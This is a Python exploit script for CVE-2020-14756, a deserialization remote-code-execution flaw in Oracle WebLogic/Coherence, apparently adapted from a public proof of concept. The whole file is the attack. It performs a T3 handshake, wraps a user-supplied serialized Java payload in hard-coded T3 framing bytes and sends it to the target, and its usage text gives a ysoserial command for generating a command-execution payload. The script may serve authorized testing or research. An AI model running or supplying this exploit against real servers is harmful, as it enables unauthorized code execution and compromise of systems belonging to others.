#!/usr/bin/env python3
"""
CVE-2020-14756 - WebLogic T3 Protocol Exploit Script

This script sends a serialized Java payload over the T3 protocol
to exploit CVE-2020-14756 in Oracle WebLogic/Coherence.

Based on Y4er's CVE-2020-14756 exploit.

Usage:
  python3 weblogic_t3.py <host> <port> <payload_file>

Example:
  python3 weblogic_t3.py 192.168.1.100 7001 payload.bin

Author: princechaddha (based on Y4er)
CVE: CVE-2020-14756
"""

import socket
import struct
import sys
import os

def send_t3_payload(host, port, payload_file):
    """
    Send T3 protocol exploit payload to WebLogic server.
    """
    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        print(f"[*] Connecting to {host}:{port}")
        sock.connect((host, int(port)))
        
        # Step 1: Send T3 handshake
        handshake = f"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://{host}:{port}\n\n"
        print(f"[*] Sending T3 handshake...")
        sock.sendall(handshake.encode())
        
        # Receive handshake response
        response = sock.recv(1024)
        print(f"[*] Received: {response[:100]}")
        
        if b"HELO" not in response:
            print("[-] T3 handshake failed - target may not be WebLogic or T3 is disabled")
            return False
        
        print("[+] T3 handshake successful!")
        
        # Step 2: Read and send payload
        print(f"[*] Reading payload from {payload_file}")
        with open(payload_file, 'rb') as f:
            payload_obj = f.read()
        
        # T3 message wrapper
        payload_prefix = bytes.fromhex(
            '000009f3'  # Length (will be recalculated)
            '0165'      # Type
            '01'        # Version
            'ffffffffffffffff'  # Context
            '00000071'  # Request ID
            '0000ea60'  # Timeout
            '00000018'  # Flags
            '43c6a2a63985b5af7d63e6'
            '4383f42a6d92c9e9af0f94'
            '7202797372007872017872'
            '0278700000000c00000002'
            '0000000000000000000000'
            '01007070707070700000000c'
            '00000002000000000000000000000000010070'
            '06fe010000'
        )
        
        payload_suffix = bytes.fromhex(
            'fe010000aced00057372001d7765626c6f6769632e726a766d2e'
            '436c6173735461626c65456e7472792f5265815f4f9ed0c0000'
            '78707200247765626c6f6769632e636f6d6d6f6e2e696e7465'
            '726e616c2e506565724966f6f723e7b8ae1ec902000749000'
            '56d616a6f724900056d696e6f7249000b70617463685570646'
            '17465'
        )
        
        # Combine payload
        full_payload = payload_prefix + payload_obj + payload_suffix
        
        # Fix length field
        length = struct.pack('>I', len(full_payload))
        full_payload = length + full_payload[4:]
        
        print(f"[*] Sending exploit payload ({len(full_payload)} bytes)...")
        sock.sendall(full_payload)
        
        # Try to receive response
        try:
            response = sock.recv(4096)
            print(f"[*] Response: {response[:200]}")
        except socket.timeout:
            print("[*] No response (may indicate successful exploitation)")
        
        print("[+] Payload sent successfully!")
        print("[+] Check if the command was executed on the target")
        return True
        
    except socket.error as e:
        print(f"[-] Socket error: {e}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        sock.close()


def main():
    print("=" * 60)
    print("CVE-2020-14756 - WebLogic T3 Exploit")
    print("Oracle Coherence Deserialization RCE")
    print("=" * 60)
    print()
    
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <host> <port> <payload_file>")
        print()
        print("Example:")
        print(f"  python3 {sys.argv[0]} 192.168.1.100 7001 payload.bin")
        print()
        print("Generate payload with:")
        print("  java -jar ysoserial.jar Coherence1 'touch /tmp/pwned' > payload.bin")
        sys.exit(1)
    
    host = sys.argv[1]
    port = sys.argv[2]
    payload_file = sys.argv[3]
    
    if not os.path.exists(payload_file):
        print(f"[-] Payload file not found: {payload_file}")
        sys.exit(1)
    
    success = send_t3_payload(host, port, payload_file)
    
    if success:
        print()
        print("[+] Exploitation attempt complete")
        print("[+] Verify by checking if command executed on target")
    else:
        print()
        print("[-] Exploitation failed")
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
